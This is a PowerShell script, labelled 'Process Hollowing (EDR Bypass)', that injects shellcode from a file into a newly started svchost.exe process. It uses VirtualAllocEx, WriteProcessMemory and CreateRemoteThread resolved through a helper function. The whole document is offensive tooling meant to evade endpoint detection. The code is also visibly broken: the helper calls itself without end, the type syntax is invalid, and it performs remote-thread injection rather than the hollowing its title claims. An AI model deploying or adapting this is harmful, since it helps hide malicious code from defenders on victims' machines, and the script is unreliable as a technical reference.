# STUA-X: PROCESS HOLLOWING (EDR BYPASS)
function Invoke-ProcessHollowing {
    param(
        [Parameter(Mandatory = $true)]
        [String]
        $ShellcodePath
    )

    # Read shellcode
    $shellcode = [IO.File]::ReadAllBytes($ShellcodePath)

    # Target process (svchost.exe)
    $targetProcess = "C:\Windows\System32\svchost.exe"
    $process = Start-Process -FilePath $targetProcess -PassThru

    # Open process with full access
    $hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateProcessA),
        [type]([UInt32], [String], [String], [IntPtr], [IntPtr], [Boolean], [UInt32], [IntPtr], [String], [IntPtr], [IntPtr])
    ).Invoke(0, $targetProcess, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [IntPtr]::Zero, [IntPtr]::Zero)

    # Allocate memory in target process
    $remoteMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll VirtualAllocEx),
        [type]([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])
    ).Invoke($process.Handle, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)

    # Write shellcode
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll WriteProcessMemory),
        [type]([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])
    ).Invoke($process.Handle, $remoteMemory, $shellcode, $shellcode.Length, [IntPtr]::Zero)

    # Create remote thread
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll CreateRemoteThread),
        [type]([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
    ).Invoke($process.Handle, [IntPtr]::Zero, 0, $remoteMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    Write-Host "[+] Shellcode injected into $targetProcess (PID: $($process.Id))" -ForegroundColor Green
}

# Helper function to resolve Windows API calls
function LookupFunc {
    param(
        [Parameter(Mandatory = $true)]
        [String]
        $Module,
        [Parameter(Mandatory = $true)]
        [String]
        $Function
    )

    $handle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll LoadLibraryA),
        [type]([String])
    ).Invoke($Module)

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (LookupFunc kernel32.dll GetProcAddress),
        [type]([IntPtr], [String])
    ).Invoke($handle, $Function)
}

Invoke-ProcessHollowing -ShellcodePath "shellcode.bin"